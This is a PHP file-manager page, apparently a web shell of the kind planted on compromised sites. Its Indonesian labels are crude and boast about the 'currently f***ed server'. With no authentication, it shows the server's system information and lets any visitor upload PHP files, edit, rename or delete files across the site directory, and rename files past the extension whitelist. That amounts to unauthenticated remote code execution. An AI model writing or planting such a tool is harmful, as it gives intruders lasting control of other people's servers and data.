<?php

$baseDir = dirname(__DIR__);
$allowedExtensions = ['php','html','png','gif','jpg'];

// Ikon folder & file (remote)
$folderIconURL = "https://img.icons8.com/ios-filled/50/ffffff/folder-invoices.png";
$fileIconURL   = "https://img.icons8.com/ios-filled/50/ffffff/document.png";

// Fungsi keamanan path
function safePath($path) {
    global $baseDir;
    $realBase = realpath($baseDir);
    $realPath = realpath($path);
    if ($realPath && strpos($realPath, $realBase) === 0) {
        return $realPath;
    }
    return $baseDir;
}
//informasi
$name = php_uname() ;



// Ambil parameter panel kiri & kanan
$leftDir  = isset($_GET['left'])  ? $_GET['left']  : $baseDir;
$rightDir = isset($_GET['right']) ? $_GET['right'] : $baseDir;

$leftDir  = safePath($leftDir);
$rightDir = safePath($rightDir);

$msg = "";

// -------------------- HANDLER: UPLOAD (panel kiri) ------------
if (isset($_POST['upload'])) {
    if (!empty($_FILES['ufile']['name'])) {
        $fileName = $_FILES['ufile']['name'];
        $tmpName  = $_FILES['ufile']['tmp_name'];
        $ext      = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
        if (in_array($ext, $allowedExtensions)) {
            $dest = $leftDir . DIRECTORY_SEPARATOR . $fileName;
            if (move_uploaded_file($tmpName, $dest)) {
                $msg = "Upload berhasil: {$fileName}";
            } else {
                $msg = "Gagal upload file.";
            }
        } else {
            $msg = "Ekstensi .{$ext} tidak diizinkan.";
        }
    }
}

// -------------------- HANDLER: HAPUS (Yes/No) -----------------
// Jika ada `delete` dan parameter confirm=yes, hapus file/folder
if (isset($_GET['delete']) && isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
    $delPath = safePath($_GET['delete']);
    if (is_dir($delPath)) {
        deleteFolder($delPath);
        @rmdir($delPath);
    } else {
        @unlink($delPath);
    }
    header("Location: ?left=" . urlencode($leftDir) . "&right=" . urlencode($rightDir));
    exit;
}

function deleteFolder($path) {
    $items = scandir($path);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $full = $path . DIRECTORY_SEPARATOR . $item;
        if (is_dir($full)) {
            deleteFolder($full);
            @rmdir($full);
        } else {
            @unlink($full);
        }
    }
}

// -------------------- HANDLER: RENAME -------------------------
if (isset($_POST['rename_submit'])) {
    $oldPath = safePath($_POST['old_path']);
    $newName = $_POST['new_name'];
    if (!empty($newName)) {
        $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;
        if (@rename($oldPath, $newPath)) {
            $msg = "Rename sukses: " . htmlspecialchars($newName);
        } else {
            $msg = "Gagal rename.";
        }
    }
}

// -------------------- HANDLER: EDIT FILE ----------------------
if (isset($_POST['save_edit'])) {
    $editPath = safePath($_POST['edit_path']);
    if (is_file($editPath)) {
        $newContent = $_POST['new_content'];
        if (file_put_contents($editPath, $newContent) !== false) {
            $msg = "File berhasil disimpan.";
        } else {
            $msg = "Gagal menyimpan file.";
        }
    }
}

// -------------------- DATA PANEL KIRI (Folder Only) -----------
$leftItems = scandir($leftDir);
$leftFolders = [];
foreach ($leftItems as $i) {
    if ($i === '.' || $i === '..') continue;
    $fullPath = $leftDir . DIRECTORY_SEPARATOR . $i;
    if (is_dir($fullPath)) {
        $leftFolders[] = $i;
    }
}

// -------------------- DATA PANEL KANAN (File Only) ------------
$rightItems = scandir($rightDir);
$rightFiles = [];
foreach ($rightItems as $i) {
    if ($i === '.' || $i === '..') continue;
    $fullPath = $rightDir . DIRECTORY_SEPARATOR . $i;
    if (is_file($fullPath)) {
        $rightFiles[] = $i;
    }
}

// -------------------- CEK PROMPT EDIT/RENAME/DELETE ----------
$editFilePath    = "";
$editFileContent = "";
$renamePath      = "";
$renameBaseName  = "";
$deletePrompt    = false;
$deleteTarget    = "";

// Jika user mau edit file
if (isset($_GET['edit'])) {
    $editFilePath = safePath($_GET['edit']);
    if (is_file($editFilePath)) {
        $editFileContent = file_get_contents($editFilePath);
    }
}

// Jika user mau rename
if (isset($_GET['rename'])) {
    $renamePath = safePath($_GET['rename']);
    if (file_exists($renamePath)) {
        $renameBaseName = basename($renamePath);
    }
}

// Jika user mau hapus tapi belum confirm=yes
if (isset($_GET['delete']) && !isset($_GET['confirm'])) {
    $deleteTarget = safePath($_GET['delete']);
    $deletePrompt = true;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>1</title>
  <style>
    body {
      margin: 0; padding: 0;
      background-color: #2b2b2b;
      font-family: sans-serif;
      color: #fff;
      height: 100vh;
      display: flex;
      flex-direction: column;
    }
    .topbar {
      background-color: #424242;
      padding: 10px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    .topbar .title {
      font-size: 16px;
      color: #ffc107;
      margin: 0;
    }
    .topbar .buttons {
      display: flex;
      gap: 8px;
    }
    .buttons a {
      text-decoration: none;
      color: #fff;
      background-color: #616161;
      padding: 4px 8px;
      border-radius: 3px;
    }
    .buttons a:hover {
      background-color: #757575;
    }
    .main {
      flex: 1;
      display: flex;
      overflow: hidden;
    }
    .panel {
      flex: 1;
      display: flex;
      flex-direction: column;
      overflow: auto;
    }
    .panel-left {
      background-color: #1f1f1f;
      border-right: 1px solid #444;
      position: relative;
    }
    .panel-right {
      background-color: #2b2b2b;
    }
    .panel-header {
      background-color: #333;
      padding: 8px;
      font-size: 14px;
      color: #bbb;
    }
    .list {
      list-style: none;
      margin: 0;
      padding: 0;
    }
    .list li {
      display: flex;
      align-items: center;
      padding: 6px 10px;
      border-bottom: 1px solid #444;
    }
    .list li:hover {
      background-color: #393939;
    }
    .icon {
      width: 24px;
      height: 24px;
      margin-right: 8px;
    }
    a.item-link {
      text-decoration: none;
      color: #cddc39;
      flex: 1;
    }
    .bottom-bar {
      background-color: #424242;
      padding: 8px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .msg {
      background-color: #616161;
      padding: 6px;
      margin: 4px;
      border-radius: 3px;
      font-size: 0.9em;
      color: #ffc107;
    }
    /* Tombol style untuk rename & delete */
    .btn {
      display: inline-block;
      padding: 4px 8px;
      background-color: #616161;
      color: #fff;
      border: none;
      border-radius: 3px;
      text-decoration: none;
      cursor: pointer;
      font-size: 0.85em;
      margin-left: 4px;
    }
    .btn:hover {
      background-color: #757575;
    }
    .btn-delete {
      background-color: #e53935;
    }
    .btn-delete:hover {
      background-color: #f44336;
    }
    .btn-rename {
      background-color: #ffc107;
    }
    .btn-rename:hover {
      background-color:rgb(97, 96, 92);
    }
    .upload-form, .rename-form, .edit-form, .delete-confirm {
      background-color: #424242;
      padding: 8px;
      margin: 8px;
      border-radius: 4px;
    }
    .upload-form input[type="file"] {
      margin: 4px 0;
    }
    .upload-form input[type="submit"],
    .rename-form input[type="submit"],
    .edit-form input[type="submit"] {
      background-color: #ffc107;
      border: none;
      padding: 4px 10px;
      cursor: pointer;
      color: #000;
      border-radius: 3px;
      margin-top: 5px;
    }
    .upload-form input[type="submit"]:hover,
    .rename-form input[type="submit"]:hover,
    .edit-form input[type="submit"]:hover {
      background-color: #ffeb3b;
    }
    .rename-form input[type="text"],
    .edit-form textarea {
      width: 100%;
      background-color: #333;
      color: #fff;
      border: 1px solid #555;
      padding: 5px;
      box-sizing: border-box;
    }
    .edit-form textarea {
      height: 200px;
      resize: vertical;
    }
    .delete-confirm a, .cancel-button {
      text-decoration: none;
      margin: 0 8px;
      background-color: #616161;
      color: #fff;
      padding: 4px 8px;
      border-radius: 3px;
      cursor: pointer;
    }
    .delete-confirm a:hover, .cancel-button:hover {
      background-color: #757575;
    }
  </style>
</head>
<body>

<!-- Top Bar -->
<div class="topbar">
  <h1 class="title">informasi server yang terkentod saat ini
  <br><br>system : <?php echo $name; ?>
  </h1>
  <div class="buttons">
    <a href="?left=<?php echo urlencode($leftDir); ?>&right=<?php echo urlencode($rightDir); ?>">Refresh</a>
  </div>
</div>

<!-- Pesan (jika ada) -->
<?php if(!empty($msg)): ?>
<div class="msg">
  <?php echo htmlspecialchars($msg); ?>
</div>
<?php endif; ?>

<div class="main">
  <!-- Panel Kiri (Folder Only) -->
  <div class="panel panel-left">
    <div class="panel-header">
      <strong>lokasi kontol saat ini</strong><br>
      <small><?php echo htmlspecialchars($leftDir); ?></small>
    </div>

    <!-- Form Upload (di header panel kiri) -->
    <div class="upload-form">
      <form method="post" enctype="multipart/form-data">
        <label>Upload File </label><br>
        <input type="file" name="ufile" required>
        <br>
        <input type="submit" name="upload" value="Upload">
      </form>
    </div>

    <!-- List Folder -->
    <ul class="list">
      <?php
      // Tombol UP
      if ($leftDir !== $baseDir) {
          $upDir = dirname($leftDir);
          echo '<li>';
          echo '<a class="item-link" href="?left=' . urlencode($upDir) . '&right=' . urlencode($rightDir) . '">↑ Up</a>';
          echo '</li>';
      }
      foreach ($leftFolders as $folder) {
          $folderPath = $leftDir . DIRECTORY_SEPARATOR . $folder;
          $folderSafe = safePath($folderPath);
          echo '<li>';
          echo '<img class="icon" src="' . $folderIconURL . '" alt="folder">';
          echo '<a class="item-link" href="?left=' . urlencode($folderSafe) . '&right=' . urlencode($folderSafe) . '">';
          echo htmlspecialchars($folder);
          echo '</a>';
          // Tombol Rename sebagai button
          echo '<a class="btn btn-rename" href="?left=' . urlencode($leftDir) . '&right=' . urlencode($rightDir) . '&rename=' . urlencode($folderSafe) . '">Rename</a>';
          // Tombol Delete sebagai button
          echo '<a class="btn btn-delete" href="?left=' . urlencode($leftDir) . '&right=' . urlencode($rightDir) . '&delete=' . urlencode($folderSafe) . '">Delete</a>';
          echo '</li>';
      }
      ?>
    </ul>
  </div>

  <!-- Panel Kanan (File Only) -->
  <div class="panel panel-right">
    <div class="panel-header">
      <strong>Isi Folder</strong><br>
      <small><?php echo htmlspecialchars($rightDir); ?></small>
    </div>

    <?php 
    // Prompt Hapus (Yes/No)
    if ($deletePrompt && $deleteTarget) {
        $baseName = basename($deleteTarget);
        echo '<div class="delete-confirm">';
        echo '<h3>Yakin hapus: ' . htmlspecialchars($baseName) . ' ?</h3>';
        echo '<a href="?left=' . urlencode($leftDir) . '&right=' . urlencode($rightDir) . '&delete=' . urlencode($deleteTarget) . '&confirm=yes">Yes</a>';
        echo '<a class="cancel-button" href="?left=' . urlencode($leftDir) . '&right=' . urlencode($rightDir) . '">No</a>';
        echo '</div>';
    }
    ?>

    <!-- Form Rename (jika user rename) -->
    <?php if($renamePath && file_exists($renamePath)): ?>
      <div class="rename-form">
        <h3>Rename: <?php echo htmlspecialchars($renameBaseName); ?></h3>
        <form method="post">
          <input type="text" name="new_name" value="<?php echo htmlspecialchars($renameBaseName); ?>">
          <input type="hidden" name="old_path" value="<?php echo htmlspecialchars($renamePath); ?>">
          <input type="submit" name="rename_submit" value="Simpan">
          <a class="cancel-button" href="?left=<?php echo urlencode($leftDir); ?>&right=<?php echo urlencode($rightDir); ?>">Batal</a>
        </form>
      </div>
    <?php endif; ?>

    <!-- Form Edit File (jika user edit) -->
    <?php if($editFilePath && is_file($editFilePath)): ?>
      <div class="edit-form">
        <h3>Edit File: <?php echo htmlspecialchars(basename($editFilePath)); ?></h3>
        <form method="post">
          <textarea name="new_content"><?php echo htmlspecialchars($editFileContent); ?></textarea>
          <input type="hidden" name="edit_path" value="<?php echo htmlspecialchars($editFilePath); ?>">
          <input type="submit" name="save_edit" value="Simpan">
          <a class="cancel-button" href="?left=<?php echo urlencode($leftDir); ?>&right=<?php echo urlencode($rightDir); ?>">Batal</a>
        </form>
      </div>
    <?php endif; ?>

    <!-- List File -->
    <ul class="list">
      <?php
      foreach ($rightFiles as $file) {
          $filePath = $rightDir . DIRECTORY_SEPARATOR . $file;
          $fileSafe = safePath($filePath);
          echo '<li>';
          echo '<img class="icon" src="' . $fileIconURL . '" alt="file">';
          echo '<a class="item-link" href="?left=' . urlencode($leftDir) . '&right=' . urlencode($rightDir) . '&edit=' . urlencode($fileSafe) . '">';
          echo htmlspecialchars($file);
          echo '</a>';
          // Tombol Rename file
          echo '<a class="btn btn-rename" href="?left=' . urlencode($leftDir) . '&right=' . urlencode($rightDir) . '&rename=' . urlencode($fileSafe) . '">Rename</a>';
          // Tombol Delete file
          echo '<a class="btn btn-delete" href="?left=' . urlencode($leftDir) . '&right=' . urlencode($rightDir) . '&delete=' . urlencode($fileSafe) . '">Delete</a>';
          echo '</li>';
      }
      ?>
    </ul>
  </div>
</div>

<!-- Bottom Bar -->
<div class="bottom-bar">
  <div>
    <a href="?left=<?php echo urlencode($baseDir); ?>&right=<?php echo urlencode($baseDir); ?>" 
       style="color:#fff; text-decoration:none; background-color:#616161; padding:4px 8px; border-radius:3px;">
       Home
    </a>
  </div>
  <div>
    <span style="color:#bbb; font-size:0.9em;">Powered by PHP</span>
  </div>
</div>

</body>
</html>
